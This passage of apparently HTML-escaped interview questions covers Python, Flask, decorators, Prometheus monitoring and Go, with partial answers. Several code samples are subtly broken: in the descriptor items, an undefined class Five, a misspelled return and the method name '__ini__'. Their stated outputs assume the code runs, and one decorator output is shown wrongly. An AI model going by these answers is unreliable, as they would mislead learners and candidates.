&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to test if an exception was raised?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &lt;code&gt;assert&lt;/code&gt; does in Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain mocks&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you measure execution time of small code snippets?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why one shouldn&#39;t use &lt;code&gt;assert&lt;/code&gt; in non-test/production code?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Flask&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you describe what is Django/Flask and how you have used it? Why Flask and not Django? (or vice versa)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a route?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; As every web framework, Flask provides a route functionality that lets you serve a content of a given URL. &lt;p&gt;There are multiple ways to map a URL with a function in Python.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Decorator: you can use python decorators. In this case we&#39;re using &lt;code&gt;app&lt;/code&gt;. This &lt;code&gt;app&lt;/code&gt; decorator is the instance of the &lt;code&gt;Flask&lt;/code&gt; class. And route it&#39;s a method of this class.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;@app.route(&#39;/&#39;)&#xA;def home():&#xA;  return &#39;main website&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;add_url_rule&lt;/code&gt; method: This is a method of the Flask class. We can also use it for map the URL with a function.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;def home():&#xA;  return &#39;main website&#39;&#xA;&#xA;app.add_url_rule(&#39;/&#39;, view_func=home)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a blueprint in Flask?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a template?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;zip&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Given &lt;code&gt;x = [1, 2, 3]&lt;/code&gt;, what is the result of list(zip(x))?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;[(1,), (2,), (3,)]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of each of the following: &lt;pre&gt;&lt;code&gt;list(zip(range(5), range(50), range(50)))&#xA;list(zip(range(5), range(50), range(-2)))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;[(0, 0, 0), (1, 1, 1), (2, 2, 2), (3, 3, 3), (4, 4, 4)]&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python Descriptors&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Descriptors&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Read about descriptors &lt;a href=&#34;https://docs.python.org/3/howto/descriptor.html&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What would be the result of running &lt;code&gt;a.num2&lt;/code&gt; assuming the following code &lt;pre&gt;&lt;code&gt;class B:&#xA;    def __get__(self, obj, objtype=None):&#xA;        reuturn 10&#xA;&#xA;class A:&#xA;    num1 = 2&#xA;    num2 = Five()&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; 10 &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What would be the result of running &lt;code&gt;some_car = Car(&#34;Red&#34;, 4)&lt;/code&gt; assuming the following code &lt;pre&gt;&lt;code&gt;class Print:&#xA;&#xA;    def __get__(self, obj, objtype=None):&#xA;        value = obj._color&#xA;        print(&#34;Color was set to {}&#34;.format(valie))&#xA;        return value&#xA;&#xA;    def __set__(self, obj, value):&#xA;        print(&#34;The color of the car is {}&#34;.format(value))&#xA;        obj._color = value&#xA;&#xA;class Car:&#xA;&#xA;    color = Print()&#xA;&#xA;    def __ini__(self, color, age):&#xA;        self.color = color&#xA;        self.age = age&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; An instance of Car class will be created and the following will be printed: &#34;The color of the car is Red&#34; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Misc&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you spawn multiple processes with Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Implement simple calculator for two numbers&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;def add(num1, num2):&#xA;    return num1 + num2&#xA;&#xA;&#xA;def sub(num1, num2):&#xA;    return num1 - num2&#xA;&#xA;&#xA;def mul(num1, num2):&#xA;    return num1*num2&#xA;&#xA;&#xA;def div(num1, num2):&#xA;    return num1 / num2&#xA;&#xA;operators = {&#xA;    &#39;+&#39;: add,&#xA;    &#39;-&#39;: sub,&#xA;    &#39;*&#39;: mul,&#xA;    &#39;/&#39;: div&#xA;}&#xA;&#xA;if __name__ == &#39;__main__&#39;:&#xA;    operator = str(input(&#34;Operator: &#34;))&#xA;    num1 = int(input(&#34;1st number: &#34;))&#xA;    num2 = int(input(&#34;2nd number: &#34;))&#xA;    print(operators[operator](num1, num2))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What data types are you familiar with that are not Python built-in types but still provided by modules which are part of the standard library?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This is a good reference &lt;a href=&#34;https://docs.python.org/3/library/datatypes.html&#34;&gt;https://docs.python.org/3/library/datatypes.html&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is a decorator&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt; &#xA; &lt;b&gt;In python, everything is an object, even functions themselves. Therefore you could pass functions as arguments for another function eg; &lt;pre&gt;&lt;code&gt;def wee(word):&#xA;    return word&#xA;&#xA;def oh(f):&#xA;    return f + &#34;Ohh&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; oh(wee(&#34;Wee&#34;))&#xA;&amp;lt;&amp;lt;&amp;lt; Wee Ohh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;This allows us to control the before execution of any given function and if we added another function as wrapper, (a function receiving another function that receives a function as parameter) we could also control the after execution.&lt;/p&gt; &lt;p&gt;Sometimes we want to control the before-after execution of many functions and it would get tedious to write&lt;/p&gt; &lt;p&gt;&lt;code&gt; f = function(function_1())&lt;/code&gt; &lt;code&gt; f = function(function_1(function_2(*args)))&lt;/code&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;every time, that&#39;s what decorators do, they introduce syntax to write all of this on the go, using the keyword &#39;@&#39;. &lt;/b&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you show how to write and use decorators?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;code&gt; These two decorators (ntimes and timer) are usually used to display decorators functionalities, you can find them in lots of tutorials/reviews. I first saw these examples two years ago in pyData 2017. https://www.youtube.com/watch?v=7lmCu8wz8ro&amp;amp;t=3731s&lt;/code&gt; &lt;pre&gt;&lt;code&gt;Simple decorator:&#xA;&#xA;def deco(f):&#xA;    print(f&#34;Hi I am the {f.__name__}() function!&#34;)&#xA;    return f&#xA;&#xA;@deco&#xA;def hello_world():&#xA;    return &#34;Hi, I&#39;m in!&#34;&#xA;&#xA;a = hello_world()&#xA;print(a)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; Hi I am the hello_world() function!&#xA;    Hi, I&#39;m in!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;This is the simplest decorator version, it basically saves us from writting &lt;code&gt;a = deco(hello_world())&lt;/code&gt;. But at this point we can only control the before execution, let&#39;s take on the after:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;def deco(f):&#xA;    def wrapper(*args, **kwargs):&#xA;        print(&#34;Rick Sanchez!&#34;)&#xA;        func = f(*args, **kwargs)&#xA;        print(&#34;I&#39;m in!&#34;)&#xA;        return func&#xA;    return wrapper&#xA;&#xA;@deco&#xA;def f(word):&#xA;    print(word)&#xA;&#xA;a = f(&#34;************&#34;)&#xA;&amp;gt;&amp;gt;&amp;gt; Rick Sanchez!&#xA;    ************&#xA;    I&#39;m in!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;deco receives a function -&amp;gt; f wrapper receives the arguments -&amp;gt; *args, **kwargs&lt;/p&gt; &lt;p&gt;wrapper returns the function plus the arguments -&amp;gt; f(*args, **kwargs) deco returns wrapper.&lt;/p&gt; &lt;p&gt;As you can see we conveniently do things before and after the execution of a given function.&lt;/p&gt; &lt;p&gt;For example, we could write a decorator that calculates the execution time of a function.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;import time&#xA;def deco(f):&#xA;    def wrapper(*args, **kwargs):&#xA;        before = time.time()&#xA;        func = f(*args, **kwargs)&#xA;        after = time.time()&#xA;        print(after-before)&#xA;        return func&#xA;    return wrapper&#xA;&#xA;@deco&#xA;def f():&#xA;    time.sleep(2)&#xA;    print(&#34;************&#34;)&#xA;&#xA;a = f()&#xA;&amp;gt;&amp;gt;&amp;gt; 2.0008859634399414&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Or create a decorator that executes a function n times.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;def n_times(n):&#xA;    def wrapper(f):&#xA;        def inner(*args, **kwargs):&#xA;            for _ in range(n):&#xA;                func = f(*args, **kwargs)&#xA;            return func&#xA;        return inner&#xA;    return wrapper&#xA;&#xA;@n_times(4)&#xA;def f():&#xA;    print(&#34;************&#34;)&#xA;&#xA;a = f()&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt;************&#xA;   ************&#xA;   ************&#xA;   ************&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Write a decorator that calculates the execution time of a function&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Write a script which will determine if a given host is accessible on a given port&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Are you familiar with Dataclasses? Can you explain what are they used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You wrote a class to represent a car. How would you compare two cars instances if two cars are equal if they have the same model and color?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;class Car:&#xA;    def __init__(self, model, color):&#xA;        self.model = model&#xA;        self.color = color&#xA;&#xA;    def __eq__(self, other):&#xA;        if not isinstance(other, Car):&#xA;            return NotImplemented&#xA;        return self.model == other.model and self.color == other.color&#xA;&#xA;&amp;gt;&amp;gt; a = Car(&#39;model_1&#39;, &#39;red&#39;)&#xA;&amp;gt;&amp;gt; b = Car(&#39;model_2&#39;, &#39;green&#39;)&#xA;&amp;gt;&amp;gt; c = Car(&#39;model_1&#39;, &#39;red&#39;)&#xA;&amp;gt;&amp;gt; a == b&#xA;False&#xA;&amp;gt;&amp;gt; a == c&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Context Manager&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Tell me everything you know about concurrency in Python&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the Buffer Protocol&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you have experience with web scraping? Can you describe what have you used and for what?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you implement Linux&#39;s &lt;code&gt;tail&lt;/code&gt; command in Python? Bonus: implement &lt;code&gt;head&lt;/code&gt; as well&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You have created a web page where a user can upload a document. But the function which reads the uploaded files, runs for a long time, based on the document size and user has to wait for the read operation to complete before he/she can continue using the web site. How can you overcome this?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How yield works exactly?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Monitoring&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain monitoring. What is it? What its goal?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Google: &#34;Monitoring is one of the primary means by which service owners keep track of a system’s health and availability&#34;. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is wrong with the old approach of watching for a specific value and trigger an email/phone alert while value is exceeded?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This approach require from a human to always check why the value exceeded and how to handle it while today, it is more effective to notify people only when they need to take an actual action. If the issue doesn&#39;t require any human intervention, then the problem can be fixed by some processes running in the relevant environment. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of monitoring outputs are you familiar with and/or used in the past?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Alerts&lt;br&gt; Tickets&lt;br&gt; Logging&lt;br&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between infrastructure monitoring and application monitoring? (methods, tools, ...)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Prometheus&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Prometheus? What are some of Prometheus&#39;s main features?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In what scenarios it might be better to NOT use Prometheus?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;From Prometheus documentation: &#34;if you need 100% accuracy, such as for per-request billing&#34;. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe Prometheus architecture and components&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you compare Prometheus to other solutions like InfluxDB for example?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an Alert?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe the following Prometheus components: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Prometheus server&lt;/li&gt; &#xA;   &lt;li&gt;Push Gateway&lt;/li&gt; &#xA;   &lt;li&gt;Alert Manager&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Prometheus server is responsible for scraping and storing the data&lt;br&gt; Push gateway is used for short-lived jobs&lt;br&gt; Alert manager is responsible for alerts ;) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an Instance? What is a Job?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What core metrics types Prometheus supports?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an exporter? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which Prometheus best practices are you familiar with?. Name at least three&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to get total requests in a given period of time?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What HA in Prometheus means?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you join two metrics?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to write a query that returns the value of a label?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you convert cpu_user_seconds to cpu usage in percentage?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Go&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are some characteristics of the Go programming language?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Strong and static typing - the type of the variables can&#39;t be changed over time and they have to be defined at compile time&lt;/li&gt; &#xA;   &lt;li&gt;Simplicity&lt;/li&gt; &#xA;   &lt;li&gt;Fast compile times&lt;/li&gt; &#xA;   &lt;li&gt;Built-in concurrency&lt;/li&gt; &#xA;   &lt;li&gt;Garbage collected&lt;/li&gt; &#xA;   &lt;li&gt;Platform independent&lt;/li&gt; &#xA;   &lt;li&gt;Compile to standalone binary - anything you need to run your app will be compiled into one binary. Very useful for version management in run-time.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Go also has good community. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between &lt;code&gt;var x int = 2&lt;/code&gt; and &lt;code&gt;x := 2&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The result is the same, a variable with the value 2.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;With &lt;code&gt;var x int = 2&lt;/code&gt; we are setting the variable type to integer while with &lt;code&gt;x := 2&lt;/code&gt; we are letting Go figure out by itself the type. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? In Go we can redeclare variables and once declared we must use it.&lt;/summary&gt; &#xA; &lt;p&gt;False. We can&#39;t redeclare variables but yes, we must used declared variables. &lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What libraries of Go have you used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;This should be answered based on your usage but some examples are:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;fmt - formatted I/O &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the problem with the following block of code? How to fix it? &lt;pre&gt;&lt;code&gt;func main() {&#xA;    var x float32 = 13.5&#xA;    var y int&#xA;    y = x&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;The following block of code tries to convert the integer 101 to a string but instead we get &#34;e&#34;. Why is that? How to fix it? &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import &#34;fmt&#34;&#xA;&#xA;func main() {&#xA;    var x int = 101&#xA;    var y string&#xA;    y = string(x)&#xA;    fmt.Println(y)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It looks what unicode value is set at 101 and uses it for converting the integer to a string. If you want to get &#34;101&#34; you should use the package &#34;strconv&#34; and replace &lt;code&gt;y = string(x)&lt;/code&gt; with &lt;code&gt;y = strconv.Itoa(x)&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is wrong with the following code?: &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;func main() {&#xA;    var x = 2&#xA;    var y = 3&#xA;    const someConst = x + y&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Constants in Go can only be declared using constant expressions. But &lt;code&gt;x&lt;/code&gt;, &lt;code&gt;y&lt;/code&gt; and their sum is variable. &lt;br&gt; &lt;code&gt;const initializer x + y is not a constant&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What will be the output of the following block of code?: &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import &#34;fmt&#34;&#xA;&#xA;const (&#xA;&#x9;x = iota&#xA;&#x9;y = iota&#xA;)&#xA;const z = iota&#xA;&#xA;func main() {&#xA;&#x9;fmt.Printf(&#34;%v\n&#34;, x)&#xA;&#x9;fmt.Printf(&#34;%v\n&#34;, y)&#xA;&#x9;fmt.Printf(&#34;%v\n&#34;, z)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Go&#39;s iota identifier is used in const declarations to simplify definitions of incrementing numbers. Because it can be used in expressions, it provides a generality beyond that of simple enumerations. &lt;br&gt; &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; in the first iota group, &lt;code&gt;z&lt;/code&gt; in the second. &lt;br&gt; &lt;a href=&#34;https://github.com/golang/go/wiki/Iota&#34;&gt;Iota page in Go Wiki&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What _ is used for in Go?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It avoids having to declare all the variables for the returns values. It is called the &lt;a href=&#34;https://golang.org/doc/effective_go.html#blank&#34;&gt;blank identifier&lt;/a&gt;. &lt;br&gt; &lt;a href=&#34;https://stackoverflow.com/questions/27764421/what-is-underscore-comma-in-a-go-declaration#answer-27764432&#34;&gt;answer in SO&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What will be the output of the following block of code?: &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import &#34;fmt&#34;&#xA;&#xA;const (&#xA;&#x9;_ = iota + 3&#xA;&#x9;x&#xA;)&#xA;&#xA;func main() {&#xA;&#x9;fmt.Printf(&#34;%v\n&#34;, x)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Since the first iota is declared with the value &lt;code&gt;3&lt;/code&gt; (&lt;code&gt; + 3&lt;/code&gt;), the next one has the value &lt;code&gt;4&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What will be the output of the following block of code?: &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import 